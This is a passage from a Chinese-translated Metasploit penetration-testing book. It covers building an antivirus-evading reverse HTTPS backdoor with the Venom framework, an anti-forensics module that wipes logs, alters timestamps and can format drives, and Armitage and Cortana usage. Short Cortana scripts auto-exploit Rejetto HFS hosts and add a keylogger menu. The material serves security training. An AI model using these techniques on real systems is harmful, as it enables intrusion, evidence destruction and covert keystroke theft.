一旦在 Kali Linux 中启动毒液，您将看到前面截图中显示的屏幕。毒液框架是 Pedro Nobrega 和 Chaitanya Haritash（**Suspicious-Shell-Activity**）的创意作品，他们致力于简化各种操作系统的 shellcode 和后门生成。让我们按*Enter*继续：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/dd0e21e5-1e9d-471e-869e-ccb982f36c43.png)

正如我们所看到的，我们有各种操作系统的创建有效载荷的选项，甚至有创建多操作系统有效载荷的选项。让我们选择`2`来选择`Windows-OS 有效载荷`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fbf36017-9e5e-4bf9-a046-87df0a73c49c.png)

我们将看到在基于 Windows 的操作系统上支持多个代理。让我们选择代理编号`16`，这是 C 和 Python 的组合，并带有 UUID 混淆。接下来，我们将看到输入本地主机的选项，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ee093683-4780-4122-969a-12bd29abf0c5.png)

添加后，我们将获得类似的选项来添加 LPORT、有效载荷和输出文件的名称。我们将选择`443`作为 LPORT，有效载荷为`reverse_winhttps`，以及任何合适的名称如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9b9c1db1-9e56-45c5-aa80-c8cc30c27017.png)

接下来，我们将看到生成过程开始，并且我们将有选择可执行文件图标的选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a9c2e20a-5fc8-4c0e-aacf-d74723501512.png)

毒液框架还将为生成的可执行文件启动匹配处理程序，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/bf150214-64cf-4001-84e0-39d36814b758.png)

一旦文件在目标上执行，我们将得到以下结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/eb732d36-722d-4c13-b576-34afd8f80890.png)

我们轻松地获得了访问权限。但我们可以看到毒液工具已经实现了最佳实践，例如使用来自 Gmail 的 SSL 证书、分段和用于通信的`shikata_ga_nai`编码器。让我们在[`virscan.org/`](http://virscan.org/)上扫描二进制文件如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d1e4214b-cba4-4af6-9778-c425206e5de5.png)

我们可以看到检测几乎可以忽略不计，只有一个杀毒软件扫描器将其检测为后门。

# 使用反取证模块覆盖痕迹

Metasploit 确实提供了许多功能来覆盖痕迹。但是，从取证的角度来看，它们仍然可能缺乏一些核心领域，这些领域可能会揭示有关攻击的活动和有用信息。互联网上有许多模块，这些模块倾向于提供自定义功能。其中一些模块会成为核心 Metasploit 存储库的一部分，而另一些则会被忽视。我们将要讨论的模块是一个提供大量功能的反取证模块，例如清除事件日志、清除日志文件、操纵注册表、.lnk 文件、.tmp、.log、浏览器历史、**预取文件**（**.pf**）、最近文档、ShellBags、Temp/最近文件夹，以及还原点。该模块的作者 Pedro Nobrega 在识别取证证据方面进行了大量工作，并创建了这个模块，考虑到取证分析。我们可以从[`github.com/r00t-3xp10it/msf-auxiliarys/blob/master/windows/auxiliarys/CleanTracks.rb`](https://github.com/r00t-3xp10it/msf-auxiliarys/blob/master/windows/auxiliarys/CleanTracks.rb)获取此模块，并使用`loadpath`命令在 Metasploit 中加载此模块，就像我们在前几章中所做的那样，或者将文件放在`post/windows/manage`目录中。让我们看看在运行此模块时需要启用哪些功能：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/aebd50a3-36bb-4365-aad6-ae9b101f60e8.png)

我们可以看到我们在模块上启用了`CLEANER`、`DEL_LOGS`和`GET_SYS`。让我们看看当我们执行此模块时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/eac5f7f4-96a5-46e6-93ce-4385f2f8d15f.png)

我们可以看到我们的模块运行正常。让我们看看它执行的操作如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3dbefbc9-2025-43b8-ae9f-00aec11ec5ca.png)

我们可以看到目标系统中的日志文件、临时文件和 shellbags 已被清除。为了确保模块已经充分工作，我们可以看到以下截图，显示了模块执行前的大量日志：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2ee9201c-684c-4d49-9a87-45658b2d0afd.png)

一旦模块被执行，系统中日志的状态发生了变化，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9108095a-e613-4056-a18f-76cd046c038d.png)

除了我们在前面的截图中看到的部分，该模块的精选选项还包括：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0b4ee2ad-536f-4e6a-8292-8bdaf6246012.png)

`DIR_MACE` 选项接受任何目录作为输入，并修改其中存在的内容的修改、访问和创建时间戳。`PANIC` 选项将格式化 NTFS 系统驱动器，因此这可能很危险。`REVERT` 选项将为大多数策略设置默认值，而 `PREVENT` 选项将尝试通过在系统中设置这些值来避免日志记录，从而防止在目标上创建日志和生成数据。这是最受欢迎的功能之一，特别是在执法方面。

# 总结

在本章中，我们看了一些专门的工具和技术，可以帮助执法机构。然而，所有这些技术必须小心实践，因为特定的法律可能会限制您在执行这些练习时。尽管如此，在本章中，我们介绍了如何代理 Meterpreter 会话。我们研究了获得持久性的 APT 技术，从目标系统中收集文件，使用毒液来混淆有效载荷，以及如何使用 Metasploit 中的反取证第三方模块来覆盖痕迹。

尝试以下练习：

+   一旦官方修复，尝试使用 Metasploit 聚合器

+   完成代码洞练习，并尝试将合法的 DLL 绑定到有效载荷，而不会使原始应用程序崩溃

+   构建自己的后渗透模块，用于 DLL 植入方法

在接下来的章节中，我们将转向臭名昭著的 Armitage 工具，并尝试设置红队环境，同时充分利用 Armitage 的自定义脚本。


# 第二十一章：使用 Armitage 进行可视化

在上一章中，我们介绍了 Metasploit 如何帮助执法机构。让我们继续介绍一个不仅可以加快渗透速度，还可以为测试团队提供广泛的红队环境的强大工具。

**Armitage**是一个 GUI 工具，作为 Metasploit 的攻击管理器。Armitage 可视化 Metasploit 操作并推荐利用。Armitage 能够为 Metasploit 提供共享访问和团队管理。

在本章中，我们将介绍 Armitage 及其功能。我们还将看看如何使用这个支持 GUI 的工具进行 Metasploit 的渗透测试。在本章的后半部分，我们将介绍 Armitage 的 Cortana 脚本。

在本章中，我们将涵盖以下关键点：

+   使用 Armitage 进行渗透测试

+   扫描网络和主机管理

+   使用 Armitage 进行后渗透

+   使用团队服务器进行红队行动

+   Cortana 脚本的基础知识

+   使用 Armitage 中的 Cortana 脚本进行攻击

因此，让我们开始使用这个出色的可视化界面进行渗透测试之旅。

# Armitage 的基础知识

Armitage 是一个图形化自动化 Metasploit 的攻击管理工具。Armitage 是用 Java 构建的，由 Raphael Mudge 创建。它是一个跨平台工具，可以在 Linux 和 Windows 操作系统上运行。

# 开始

在本章中，我们将在 Kali Linux 中使用 Armitage。要启动 Armitage，请执行以下步骤：

1.  打开终端，输入`armitage`命令，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/af461320-7762-4253-82d8-b5b32a9b3b46.png)

1.  点击弹出框中的连接按钮以建立连接。

1.  要运行`armitage`命令，Metasploit 的**远程过程调用**（**RPC**）服务器应该在运行中。当我们点击上一个弹出框中的连接按钮时，会出现一个新的弹出框询问我们是否要启动 Metasploit 的 RPC 服务器。如下截图所示，点击 Yes：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3af11f8c-1231-4443-b981-641c756dba75.png)

1.  启动 Metasploit RPC 服务器需要一点时间。在此过程中，我们会看到诸如 Connection refused 等消息。这些错误是由于 Armitage 对连接进行检查并测试是否已建立。我们可以看到这样的错误，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c54a8575-b5b1-4281-b91c-50753df51589.png)

在开始使用 Armitage 时需要牢记的一些关键点如下：

+   确保你是 root 用户

+   对于 Kali Linux 用户，如果未安装 Armitage，请使用`apt-get install armitage`命令进行安装

如果 Armitage 无法找到数据库文件，请确保 Metasploit 数据库已初始化并正在运行。可以使用`msfdb init`命令初始化数据库，并使用`msfdb start`命令启动数据库。

# 浏览用户界面

如果连接正确建立，我们将看到 Armitage 界面面板。它将类似于以下截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0f986f67-a2cd-4917-8c61-c50fb92fdfaa.png)

Armitage 的界面很简单，主要包含三个不同的窗格，如前面的截图所示。让我们看看这三个窗格应该做什么：

+   左上角的第一个窗格包含了 Metasploit 提供的各种模块的引用：辅助、利用、有效载荷和后期。我们可以浏览并双击一个模块以立即启动它。此外，在第一个窗格之后，有一个小的输入框，我们可以使用它立即搜索模块，而不必探索层次结构。

+   第二个窗格显示了网络中存在的所有主机。例如，它将以图形格式显示运行 Windows 的系统为监视器，并显示 Windows 标志。同样，Linux 系统显示 Linux 标志，其他系统显示其他标志。它还会显示打印机的打印机符号，这是 Armitage 的一个很好的功能，因为它帮助我们识别网络上的设备。

+   第三个窗格显示了所有操作、后渗透过程、扫描过程、Metasploit 的控制台以及后渗透模块的结果。

# 管理工作区

正如我们在之前的章节中已经看到的，工作区用于维护各种攻击配置文件，而不会合并结果。假设我们正在处理一个范围，由于某种原因，我们需要停止测试并测试另一个范围。在这种情况下，我们将创建一个新的工作区，并使用该工作区来测试新的范围，以保持结果清晰和有组织。然而，在我们完成这个工作区的工作后，我们可以切换到另一个工作区。切换工作区将自动加载工作区的所有相关数据。这个功能将帮助保持所有扫描的数据分开，防止来自各种扫描的数据合并。

要创建一个新的工作区，导航到工作区选项卡并点击管理。这将呈现给我们工作区选项卡，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7d4163ea-5193-4487-845e-c10de2c62e72.png)

在 Armitage 的第三个窗格中将打开一个新选项卡，用于显示有关工作区的所有信息。我们在这里看不到任何列出的东西，因为我们还没有创建任何工作区。

因此，让我们通过点击添加来创建一个工作区，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9c2cc7cc-1dfc-4a90-941d-59b9a89450ca.png)

我们可以用任何想要的名称添加工作区。假设我们添加了一个内部范围`192.168.10.0/24`。让我们看看在添加范围后工作区选项卡是什么样子的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9b6030d1-c559-4fca-96e0-55063fceb2db.png)

我们可以随时在所需的工作区之间切换，并点击激活按钮。

# 扫描网络和主机管理

Armitage 有一个名为 Hosts 的单独选项卡，用于管理和扫描主机。我们可以通过在 Hosts 选项卡上点击从文件导入主机来将主机导入到 Armitage 中，或者我们可以通过在 Hosts 选项卡上点击添加主机选项来手动添加主机。

Armitage 还提供了扫描主机的选项。有两种类型的扫描：Nmap 扫描和 MSF 扫描。MSF 扫描利用 Metasploit 中的各种端口和服务扫描模块，而 Nmap 扫描利用流行的端口扫描工具**Network Mapper**（Nmap）。

通过从 Hosts 选项卡中选择 MSF 扫描选项来扫描网络。但是，在点击 MSF 扫描后，Armitage 将显示一个弹出窗口，询问目标范围，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8c5d2d7b-8426-4b0c-95b5-479d2a995954.png)

一旦我们输入目标范围，Metasploit 将开始扫描网络以识别端口、服务和操作系统。我们可以在界面的第三个窗格中查看扫描详情，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b0d56ce7-eac8-4881-97b4-88c6df9d5661.png)

扫描完成后，目标网络上的每个主机都将以图标的形式出现在界面的第二个窗格中，代表主机的操作系统，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/626f0772-2489-41ea-8c46-8196794eb533.png)

在上面的截图中，我们有一个 Windows Server 2008，一个 Windows Server 2012 和一个 Windows 10 系统。让我们看看目标上运行着什么服务。

# 建模漏洞

通过右键单击所需主机并点击服务，让我们看看目标范围内主机上运行着什么服务。结果应该类似于下面的截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f4a9346c-4753-4b6b-b518-89f3cf00cd6e.png)

我们可以看到`192.168.10.109`主机上运行着许多服务，比如 Microsoft IIS httpd 7.0、Microsoft Windows RPC、HttpFileServer httpd 2.3 等等。让我们指示 Armitage 为这些服务找到匹配的漏洞。

# 寻找匹配

我们可以通过选择一个主机，然后浏览 Attacks 选项卡并点击 Find Attack 来找到目标的匹配攻击。Find Attack 选项将根据目标主机上运行的服务与攻击数据库进行匹配。Armitage 在将所有服务与攻击数据库进行匹配后生成一个弹窗，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1722499f-f824-4a69-ac44-6306fce700f9.png)

点击 OK 后，我们会注意到每当右键单击主机时，菜单上会出现一个名为 Attack 的新选项。Attack 子菜单将显示我们可以对目标主机发动的所有匹配的攻击模块。

# 使用 Armitage 进行攻击

当攻击菜单对主机可用时，我们就可以开始利用目标了。让我们从攻击菜单中选择使用 Rejetto HTTPFileServer 远程命令执行漏洞来攻击 HttpFileServer httpd 2.3。点击 Exploit 选项将弹出一个新的弹窗显示所有设置。让我们按照以下设置所有必需的选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/94a67f31-b4dc-4122-9b48-118079587696.png)

设置好所有选项后，点击 Launch 来运行漏洞模块对目标进行攻击。在我们启动`exploit`模块后，我们将能够在界面的第三个窗格中看到对目标的利用正在进行，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0b91d639-a6a6-437b-aea1-ff0bdad70c9c.png)

我们可以看到 Meterpreter 正在启动，这表示成功利用了目标。此外，目标主机的图标也会变成带有红色闪电的被控制系统图标。

# 使用 Armitage 进行后渗透

Armitage 使得后渗透变得如同点击按钮一样简单。要执行后渗透模块，右键单击被利用的主机，然后选择 Meterpreter 4，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/492fcd22-b7d2-4c85-831d-0b0c8ab20dfc.png)

选择 Meterpreter 将在各个部分中显示所有后渗透模块。如果我们想提升权限或获得系统级访问权限，我们将导航到 Access 子菜单，并根据我们的需求点击适当的按钮。

与 Interact 子菜单提供获取命令提示符、另一个 Meterpreter 等选项。Explore 子菜单提供浏览文件、显示进程、记录按键、截图、摄像头拍摄和后模块等选项，用于启动不在此子菜单中的其他后渗透模块。

如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4256f110-7ed2-4bea-bffb-ecd9fd036212.png)

点击 Browse Files 来运行一个简单的后渗透模块，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9082c863-794d-4ae1-bd6a-578ca07d5ed3.png)

通过点击适当的按钮，我们可以轻松地在目标系统上上传、下载和查看任何文件。这就是 Armitage 的美妙之处；它将命令远离我们，并以图形格式呈现一切。

这就结束了我们使用 Armitage 进行远程渗透攻击。

# 使用 Armitage 团队服务器进行红队行动

对于大型渗透测试环境，通常需要进行红队行动，即一组渗透测试人员可以共同开展项目，以获得更好的结果。Armitage 提供了一个团队服务器，可以用于与渗透测试团队的成员高效共享操作。我们可以使用`teamserver`命令快速启动一个团队服务器，后面跟上可访问的 IP 地址和我们选择的密码，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6b08fc56-4dbb-4220-a073-a4c5a03e27f4.png)

我们可以看到我们已经在 IP 地址`192.168.10.107`上启动了一个团队服务器的实例，并使用密码 hackers 进行身份验证。我们可以看到在成功初始化后，我们有了需要在团队成员之间传播的凭据详细信息。现在，让我们通过使用`armitage`命令从命令行初始化 Armitage 并输入连接详细信息来连接到这个团队服务器，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c4289974-cba1-4f36-b98a-41b27b431e19.png)

一旦成功建立连接，我们将看到一个类似于以下的屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/65136d4b-80ba-4c61-a52f-7ff9ce8ae8a3.png)

我们可以看到指纹与我们的团队服务器呈现的指纹相同。让我们选择是以继续：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b5ea2553-e86a-400b-b527-c79b4759abd3.png)

我们可以选择一个昵称加入团队服务器。让我们按下 OK 进行连接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a71b0b64-4dcf-4342-a621-b3164e31ee8a.png)

我们可以看到我们已经成功从我们的本地 Armitage 实例连接到团队服务器。此外，所有连接的用户都可以通过事件日志窗口互相聊天。假设我们有另一个用户加入了团队服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6efadf21-30e8-429c-99c5-1eb085286862.png)

我们可以看到两个不同的用户互相交谈，并且从各自的实例连接。让我们初始化一个端口扫描，看看会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/74ce3220-9e8d-4767-97d8-95f3aecf8038.png)

我们可以看到用户`Nipun`开始了一个端口扫描，并且立即为另一个用户填充了，他可以查看目标。考虑到`Nipun`添加了一个主机进行测试并利用它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b8bb8e67-ee1b-4903-90be-929bedbb458a.png)

我们可以看到用户`Kislay`也能够查看扫描的所有活动。但是，要让用户`Kislay`访问 Meterpreter，他需要切换到控制台空间，并输入`sessions`命令，然后是标识符，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8218027f-00c6-475a-829b-0ae2a630698d.png)

我们可以看到，Armitage 使我们能够以比使用单个 Metasploit 实例更高效地在团队环境中工作。让我们在下一节中看看如何编写 Armitage 脚本。

# 编写 Armitage 脚本

Cortana 是一种用于在 Armitage 中创建攻击向量的脚本语言。渗透测试人员使用 Cortana 进行红队行动，并虚拟克隆攻击向量，使其像机器人一样行动。然而，红队是一个独立的团队，挑战组织以提高其效率和安全性。

Cortana 使用 Metasploit 的远程过程客户端，利用一种脚本语言。它提供了在控制 Metasploit 的操作和自动管理数据库方面的灵活性。

此外，Cortana 脚本可以在特定事件发生时自动化渗透测试人员的响应。假设我们正在对一个包含 100 个系统的网络进行渗透测试，其中 29 个系统运行 Windows Server 2012，另一个系统运行 Linux 操作系统，我们需要一个机制，将自动利用每个运行 HttpFileServer httpd 2.3 的 Windows Server 2012 系统上的端口`8081`的 Rejetto HTTPFileServer 远程命令执行漏洞。

我们可以快速开发一个简单的脚本，将自动化整个任务并节省大量时间。一个用于自动化此任务的脚本将利用`rejetto_hfs_exec`漏洞在每个系统上执行预定的后渗透功能。

# Cortana 的基本原理

使用 Cortana 编写基本攻击将帮助我们更广泛地了解 Cortana。因此，让我们看一个自动化在端口`8081`上对 Windows 操作系统进行利用的示例脚本：

```
on service_add_8081 { 
      println("Hacking a Host running $1 (" . host_os($1) . ")"); 
      if (host_os($1) eq "Windows 7") { 
              exploit("windows/http/rejetto_hfs_exec", $1, %(RPORT => "8081")); 
      } 
} 
```

当 Nmap 或 MSF 扫描发现端口`8081`开放时，前面的脚本将执行。脚本将检查目标是否在运行 Windows 7 系统，Cortana 将自动攻击端口`8081`上的主机，使用`rejetto_hfs_exec`漏洞利用。

在前面的脚本中，`$1`指定了主机的 IP 地址。`print_ln`打印字符串和变量。`host_os`是 Cortana 中返回主机操作系统的函数。`exploit`函数在由`$1`参数指定的地址上启动一个利用模块，`%`表示可以为利用设置的选项，以防服务在不同端口运行或需要额外的详细信息。`service_add_8081`指定了在特定客户端上发现端口`8081`开放时要触发的事件。

让我们保存前面提到的脚本，并通过导航到 Armitage 选项卡并点击脚本来加载这个脚本到 Armitage 中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/584bf0a6-cd82-4782-bde6-2de4eae73c52.png)

要针对目标运行脚本，请执行以下步骤：

1.  点击加载按钮将 Cortana 脚本加载到 Armitage 中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/77a4eb4f-ef34-451f-9395-527561f9b591.png)

1.  选择脚本，然后点击打开。该操作将永久加载脚本到 Armitage 中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/140a0537-2c19-461c-a5f3-6b0ae464a308.png)

1.  转到 Cortana 控制台，输入`help`命令以列出 Cortana 在处理脚本时可以使用的各种选项。

1.  接下来，为了查看 Cortana 脚本运行时执行的各种操作，我们将使用`logon`命令，后跟脚本的名称。`logon`命令将为脚本提供日志记录功能，并记录脚本执行的每个操作，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f3932965-f2b2-4e18-9458-22c372f6d9f8.png)

1.  现在，让我们通过浏览主机选项卡并从 Nmap 子菜单中选择强烈扫描来对目标进行强烈扫描。

1.  正如我们所看到的，我们发现一个开放端口为`8081`的主机。让我们回到我们的`Cortana`控制台，看看是否发生了一些活动：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4b097d26-cb9d-4d41-b308-307cecae4d34.png)

1.  砰！Cortana 已经通过在目标主机上自动启动漏洞利用程序来接管了主机。

正如我们所看到的，Cortana 通过自动执行操作为我们简化了渗透测试。在接下来的几节中，我们将看看如何使用 Cortana 自动化后期利用并处理 Metasploit 的进一步操作。

# 控制 Metasploit

Cortana 非常好地控制了 Metasploit 的功能。我们可以使用 Cortana 向 Metasploit 发送任何命令。让我们看一个示例脚本，以帮助我们更多地了解如何从 Cortana 控制 Metasploit 的功能：

```
cmd_async("hosts"); 
cmd_async("services"); 
on console_hosts { 
println("Hosts in the Database"); 
println(" $3 "); 
} 
on console_services { 
println("Services in the Database"); 
println(" $3 "); 
} 
```

在前面的脚本中，`cmd_async`命令将`hosts`和`services`命令发送到 Metasploit，并确保它们被执行。此外，`console_*`函数用于打印由`cmd_async`发送的命令的输出。Metasploit 将执行这些命令；但是，为了打印输出，我们需要定义`console_*`函数。此外，`$3`是保存由 Metasploit 执行的命令的输出的参数。加载`ready.cna`脚本后，让我们打开 Cortana 控制台查看输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/217527e6-be8f-4d29-bce9-fc01ff464459.png)

显然，命令的输出显示在前面的截图中，这结束了我们目前的讨论。但是，有关 Cortana 脚本和通过 Armitage 控制 Metasploit 的更多信息可以在以下网址获得：[`www.fastandeasyhacking.com/download/cortana/cortana_tutorial.pdf`](http://www.fastandeasyhacking.com/download/cortana/cortana_tutorial.pdf)。

# 使用 Cortana 进行后期利用

Cortana 的后期利用也很简单。Cortana 的内置功能可以使后期利用变得容易。让我们通过以下示例脚本来理解这一点：

```
on heartbeat_15s { 
local('$sid'); 
foreach $sid (session_ids()) { 
if (-iswinmeterpreter $sid && -isready $sid) {   
m_cmd($sid, "getuid"); 
m_cmd($sid, "getpid"); 
on meterpreter_getuid { 
println(" $3 "); 
} 
on meterpreter_getpid { 
println(" $3 "); 
} 
} 
} 
} 
```

在上面的脚本中，我们使用了一个名为`heartbeat_15s`的函数。这个函数每`15`秒重复执行一次。因此，它被称为**心跳**函数。

`local`函数将表示`$sid`是当前函数的本地变量。下一个`foreach`语句是一个循环，遍历每个打开的会话。`if`语句将检查会话类型是否为 Windows Meterpreter，并且它已准备好进行交互和接受命令。

`m_cmd`函数将使用参数`$sid`发送命令到 Meterpreter 会话，其中`$sid`是会话 ID，以及要执行的命令。接下来，我们定义一个以`meterpreter_*`开头的函数，其中`*`表示发送到 Meterpreter 会话的命令。此函数将打印`sent`命令的输出，就像我们在上一个练习中为`console_hosts`和`console_services`所做的那样。

让我们运行这个脚本并分析结果，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7a34370a-ad60-44c1-9130-df5be248b91e.png)

一旦我们加载脚本，它将在每`15`秒后显示目标的用户 ID 和当前进程 ID。

有关 Cortana 中的后期利用、脚本和函数的更多信息，请参阅[`www.fastandeasyhacking.com/download/cortana/cortana_tutorial.pdf`](http://www.fastandeasyhacking.com/download/cortana/cortana_tutorial.pdf)。

# 在 Cortana 中构建自定义菜单

Cortana 在构建自定义弹出菜单方面也提供了出色的输出，这些菜单在获取 Meterpreter 会话和其他类型的会话后附加到主机上。让我们使用 Cortana 构建一个自定义键盘记录器菜单，并通过分析以下脚本来了解其工作原理：

```
popup meterpreter_bottom { 
menu "&My Key Logger" { 
item "&Start Key Logger" { 
m_cmd($1, "keyscan_start"); 
} 
item "&Stop Key Logger" { 
m_cmd($1, "keyscan_stop"); 
} 
item "&Show Keylogs" { 
m_cmd($1, "keyscan_dump"); 
} 
on meterpreter_keyscan_start { 
println(" $3 "); 
} 
on meterpreter_keyscan_stop { 
println(" $3 "); 
} 
on meterpreter_keyscan_dump { 
println(" $3 "); 
} 
} 
}
```

上面的示例显示了在 Meterpreter 子菜单中创建弹出窗口。但是，只有在我们能够利用目标主机并成功获取 Meterpreter shell 时，此弹出窗口才可用。

`popup`关键字将表示弹出窗口的创建。`meterpreter_bottom`函数将表示 Armitage 将在用户右键单击受损的主机并选择`Meterpreter`选项时在底部显示此菜单。`item`关键字指定菜单中的各个项目。`m_cmd`命令是将 Meterpreter 命令与其相应的会话 ID 发送到 Metasploit 的命令。

因此，在上面的脚本中，我们有三个项目：启动键盘记录器，停止键盘记录器和显示键盘记录。它们分别用于启动键盘记录，停止键盘记录和显示日志中存在的数据。我们还声明了三个函数，用于处理发送到 Meterpreter 的命令的输出。让我们将这个脚本加载到 Cortana 中，利用主机，并在受损的主机上右键单击，这将呈现给我们以下菜单：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/957b1aa2-bf28-492c-ba8f-c1db6e7d5da8.png)

我们可以看到，每当我们右键单击受损的主机并浏览 Meterpreter 3 菜单时，我们将看到一个名为 My Key Logger 的新菜单列在所有菜单的底部。此菜单将包含我们在脚本中声明的所有项目。每当我们从此菜单中选择一个选项时，相应的命令将运行并在 Cortana 控制台上显示其输出。让我们选择第一个选项“启动键盘记录器”。等待一段时间，让目标输入一些内容，然后从菜单中选择第三个选项“显示键盘记录”，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ec6a305a-960e-42b0-896f-546d7f7ca93f.png)

当我们点击“显示键盘记录”选项时，我们将在 Cortana 控制台中看到在受损主机上工作的人键入的字符，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/437df24b-fe7f-47f2-9c1d-ac313072dcda.png)

# 使用接口进行工作

Cortana 在处理界面时也提供了灵活的方法。Cortana 提供了创建快捷方式、表格、切换选项卡和各种其他操作的选项和功能。假设我们想要添加自定义功能，比如当我们从键盘按下*F1*键时，Cortana 会显示目标主机的`UID`。让我们看一个能实现这一功能的脚本的例子：

```
bind F1 { 
$sid ="3"; 
spawn(&gu, \$sid);   
}  
sub gu{   
m_cmd($sid,"getuid"); 
on meterpreter_getuid { 
show_message( " $3 "); 
} 
} 
```

上面的脚本将添加一个快捷键`F1`，按下时将显示目标系统的`UID`。脚本中的`bind`关键字表示将功能与*F1*键绑定。接下来，我们将`$sid`变量的值定义为`3`（这是我们将要交互的会话 ID 的值）。

`spawn`函数将创建一个新的 Cortana 实例，执行`gu`函数，并将值`$sid`安装到新实例的全局范围内。`gu`函数将向 Meterpreter 发送`getuid`命令。`meterpreter_getuid`命令将处理`getuid`命令的输出。

`show_message`命令将显示一个消息，显示`getuid`命令的输出。让我们将脚本加载到 Armitage 中，按下*F1*键来检查并查看我们当前的脚本是否正确执行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a7bf4358-85b6-456c-a08f-d488d89452fa.png)

砰！我们很容易得到了目标系统的`UID`，它是 WIN-SWIKKOTKSHXmm。这结束了我们关于使用 Armitage 的 Cortana 脚本的讨论。

有关 Cortana 脚本及其各种功能的更多信息，请参阅：[`www.fastandeasyhacking.com/download/cortana/cortana_tutorial.pdf`](http://www.fastandeasyhacking.com/download/cortana/cortana_tutorial.pdf)。

# 总结

在本章中，我们仔细研究了 Armitage 及其多种功能。我们首先看了界面和工作区的建立。我们还看到了如何利用 Armitage 对主机进行利用。我们研究了远程利用和客户端利用以及后期利用。此外，我们还深入研究了 Cortana，并讨论了它的基本原理，使用它来控制 Metasploit，编写后期利用脚本，自定义菜单和界面等。


# 第二十二章：技巧和窍门

